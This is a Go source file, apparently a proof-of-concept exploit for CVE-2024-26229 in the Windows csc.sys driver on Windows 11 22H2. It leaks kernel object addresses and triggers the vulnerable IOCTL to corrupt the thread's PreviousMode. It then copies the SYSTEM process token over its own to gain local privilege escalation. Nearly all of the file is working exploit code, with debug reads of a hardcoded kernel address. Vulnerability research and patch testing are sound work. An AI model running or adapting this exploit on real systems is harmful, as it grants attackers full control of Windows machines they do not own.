/*
				PoC Info
-------------------------------------------
Vulnerability:	CVE-2024-26229
Environment:	Windows 11 22h2 Build 22621
-------------------------------------------
*/

package cve

import (
	"fmt"
	"unsafe"

	"github.com/ddkwork/ddk/ntdll"
	"github.com/ddkwork/ddk/xed"
	"github.com/ddkwork/golibrary/mylog"
	"golang.org/x/sys/windows"
)

const (
	EprocessTokenOffset       = 0x4B8
	KthreadPreviousModeOffset = 0x232
	CscDevFcbXxxControlFile   = 0x001401a3 // vuln ioctl
)

type SystemHandleTableEntryInfo struct {
	UniqueProcessId       uint16
	CreatorBackTraceIndex uint16
	ObjectTypeIndex       byte
	HandleAttributes      byte
	HandleValue           uint16
	Object                uintptr
	GrantedAccess         uint32
}

func setObject(objectPtr *uintptr, pid uint32, handle windows.Handle) {
	for h := range NtQuerySystemInformation[SystemHandleTableEntryInfo](windows.SystemHandleInformation) {
		if h.UniqueProcessId == uint16(pid) && h.HandleValue == uint16(handle) {
			*objectPtr = h.Object
			return
		}
	}
	panic("can not find object")
}

func Cve202426229() ntdll.NtStatus {
	var iosb ntdll.IoStatusBlock
	var handle ntdll.Handle

	var SysProc, CurrentProc, CurrentThread uintptr
	var handleCurrentProc, hThread windows.Handle

	var (
		// KernelMode   = 0
		UserMode = 1
	)

	objectAttr := InitializeObjectAttributes("\\Device\\Mup\\;Csc\\.\\.")
	fmt.Println("[*] Attempting to create file with NtCreateFile...")
	mylog.Check(ntdll.NtCreateFile(
		&handle,
		windows.SYNCHRONIZE,
		&objectAttr,
		&iosb,
		nil,
		windows.FILE_ATTRIBUTE_NORMAL,
		0,
		windows.FILE_OPEN_IF,
		windows.FILE_CREATE_TREE_CONNECTION,
		nil,
		0))

	// Leak System _EPROCESS kernel address
	setObject(&SysProc, 4, 4)

	fmt.Printf("[+] System EPROCESS address = %x\n", SysProc)

	// Leak current _KTHREAD kernel address
	hThread = mylog.Check2(windows.OpenThread(windows.THREAD_QUERY_INFORMATION, true, windows.GetCurrentThreadId()))
	if hThread != 0 {
		setObject(&CurrentThread, windows.GetCurrentProcessId(), hThread)
		fmt.Printf("[+] Current THREAD address = %x\n", CurrentThread)
	}

	// Leak current _EPROCESS kernel address
	handleCurrentProc = mylog.Check2(windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, true, windows.GetCurrentProcessId()))
	if handleCurrentProc != 0 {
		setObject(&CurrentProc, windows.GetCurrentProcessId(), handleCurrentProc)
		fmt.Printf("[+] Current EPROCESS address = %x\n", CurrentProc)
	}

	// Sending the payload to the csc.sys driver to trigger the bug
	status := ntdll.NtFsControlFile(
		handle,
		0,
		nil,
		nil,
		&iosb,
		CscDevFcbXxxControlFile,
		(*byte)(unsafe.Pointer(CurrentThread+KthreadPreviousModeOffset-0x18)),
		0,
		nil,
		0,
	)
	mylog.Check(status.Error())

	fmt.Println("[!] Leveraging DKOM to achieve LPE")
	fmt.Println("[!] Calling NtWriteVirtualMemory wrapper to overwrite current EPROCESS->Token")
	var size uintptr
	ntdll.NtWriteVirtualMemory(
		ntdll.Handle(windows.CurrentProcess()),
		(*byte)(unsafe.Pointer(CurrentProc+EprocessTokenOffset)),
		(*byte)(unsafe.Pointer(SysProc+EprocessTokenOffset)),
		8, &size)

	SystemCr3 := uintptr(0)
	ntdll.NtReadVirtualMemory(
		ntdll.Handle(windows.CurrentProcess()),
		(*byte)(unsafe.Pointer(SysProc+0x28)),
		(*byte)(unsafe.Pointer(&SystemCr3)),
		8, &size)
	fmt.Printf("[!] SystemCr3: %x\n", SystemCr3)

	b := [130]byte{}
	ntdll.NtReadVirtualMemory(
		ntdll.Handle(windows.CurrentProcess()),
		(*byte)(unsafe.Pointer(uintptr(0xFFFFF8053A2B5CB0))),
		(*byte)(unsafe.Pointer(&b)),
		130, &size)
	// mylog.HexDump("NtDeviceIoControlFile", b[:])
	x := xed.New(b[:]).Decode64()
	println(x.IntelSyntaxAsm.String())
	mylog.Hex("KernelBase", GetKernelBase().ImageBase)
	// IopXxxControlFile todo

	// Restoring KTHREAD->PreviousMode
	ntdll.NtWriteVirtualMemory(
		ntdll.Handle(windows.CurrentProcess()),
		(*byte)(unsafe.Pointer(CurrentThread+KthreadPreviousModeOffset)),
		(*byte)(unsafe.Pointer(&UserMode)),
		1, &size)
	return ntdll.STATUS_SUCCESS
}
